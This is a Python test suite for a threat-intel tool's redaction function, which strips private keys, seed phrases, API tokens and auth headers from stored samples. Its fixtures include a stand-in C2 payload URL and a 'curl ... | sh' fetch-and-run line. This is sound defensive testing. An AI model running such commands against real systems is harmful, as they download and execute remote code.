"""Guardrail 5: secret-shaped content is redacted before storage.

Every sample below is assembled at runtime from fragments or random bytes, so no
secret-shaped literal ever appears in the repository.
"""

import base64
import hashlib
import os
import string

import pytest
from mnemonic import Mnemonic

from icp_threat_intel.core.redaction import redact, redact_headers

DASHES = "-" * 5


def _b64(n: int) -> str:
    return base64.b64encode(os.urandom(n)).decode()


def _pem(label: str) -> str:
    body = "\n".join(_b64(48) for _ in range(4))
    return f"{DASHES}BEGIN {label}{DASHES}\n{body}\n{DASHES}END {label}{DASHES}\n"


def _alnum(n: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(alphabet[b % len(alphabet)] for b in os.urandom(n))


def _samples() -> list[tuple[str, str]]:
    return [
        ("private_key_pem", _pem("PRIVATE " + "KEY")),
        ("private_key_pem", _pem("RSA PRIVATE " + "KEY")),
        ("private_key_pem", _pem("OPENSSH PRIVATE " + "KEY")),
        ("identity_pem", _pem("EC PRIVATE " + "KEY")),
        ("seed_phrase", Mnemonic("english").generate(strength=128)),
        ("seed_phrase", Mnemonic("english").generate(strength=256)),
        ("api_token", "sk-" + "ant-" + "api03-" + _alnum(40)),
        ("api_token", "gh" + "p_" + _alnum(36)),
        ("api_token", "github" + "_pat_" + _alnum(60)),
        ("api_token", "AK" + "IA" + _alnum(16).upper()),
        ("api_token", "np" + "m_" + _alnum(36)),
        ("api_token", "xo" + "xb-" + _alnum(30)),
        ("npm_auth_token", "//registry.npmjs.org/:_auth" + "Token=" + _alnum(36)),
    ]


@pytest.mark.parametrize(("kind", "secret"), _samples())
def test_secret_is_redacted(kind: str, secret: str) -> None:
    c2_url = "https://payload.example/stage2.bin"
    original = f"{c2_url}\n{secret}\ntrailer".encode()
    result = redact(original)
    assert result.redacted is True
    assert kind in result.kinds
    assert result.sha256 == hashlib.sha256(original).hexdigest()
    assert result.stored_sha256 == hashlib.sha256(result.body).hexdigest()
    assert result.sha256 != result.stored_sha256
    assert f"[REDACTED:{kind}:".encode() in result.body
    # The secret is gone; the evidence around it stays.
    for line in secret.splitlines():
        token = line.split("=")[-1]
        if len(token) >= 16:
            assert token.encode() not in result.body
    assert c2_url.encode() in result.body
    assert result.body.endswith(b"trailer")


def test_marker_carries_hash_prefix_of_the_span() -> None:
    secret = "gh" + "p_" + _alnum(36)
    result = redact(secret.encode())
    prefix = hashlib.sha256(secret.encode()).hexdigest()[:12]
    assert result.body == f"[REDACTED:api_token:{prefix}]".encode()


def test_truncated_pem_without_end_marker_is_redacted() -> None:
    head = f"{DASHES}BEGIN PRIVATE " + f"KEY{DASHES}\n" + _b64(300)
    result = redact(head.encode())
    assert result.redacted
    assert b"PRIVATE " + b"KEY" not in result.body


@pytest.mark.parametrize(
    "benign",
    [
        b"https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/",
        hashlib.sha256(b"module").hexdigest().encode(),
        base64.b64encode(bytes(range(256)) * 2),
        b"curl -fsSL https://example.invalid/x | sh",
        b"The backdoor polled the canister roughly every fifty minutes for a new link.",
        b"tdtqy-oyaaa-aaaae-af2dq-cai cjn37-uyaaa-aaaac-qgnva-cai",
        b"",
    ],
)
def test_benign_bodies_pass_through_unchanged(benign: bytes) -> None:
    result = redact(benign)
    assert result.redacted is False
    assert result.kinds == ()
    assert result.body == benign
    assert result.sha256 == result.stored_sha256


def test_redaction_is_idempotent() -> None:
    once = redact(_pem("PRIVATE " + "KEY").encode())
    twice = redact(once.body)
    assert twice.redacted is False
    assert twice.body == once.body


def test_binary_bodies_are_scanned() -> None:
    secret = ("gh" + "o_" + _alnum(36)).encode()
    result = redact(b"\x00\xff\xfe" + secret + b"\x00")
    assert result.redacted
    assert secret not in result.body


def test_sensitive_headers_are_redacted() -> None:
    token = _alnum(32)
    headers = {
        "Authorization": "Bearer " + token,
        "Auth-Key": token,
        "Set-Cookie": "session=" + token,
        "Content-Type": "text/plain",
        "X-Debug": "gh" + "p_" + _alnum(36),
    }
    cleaned, kinds = redact_headers(headers)
    assert cleaned["Content-Type"] == "text/plain"
    for name in ("Authorization", "Auth-Key", "Set-Cookie", "X-Debug"):
        assert token not in cleaned[name]
        assert cleaned[name].startswith("[REDACTED:")
    assert "header" in kinds
    assert "api_token" in kinds
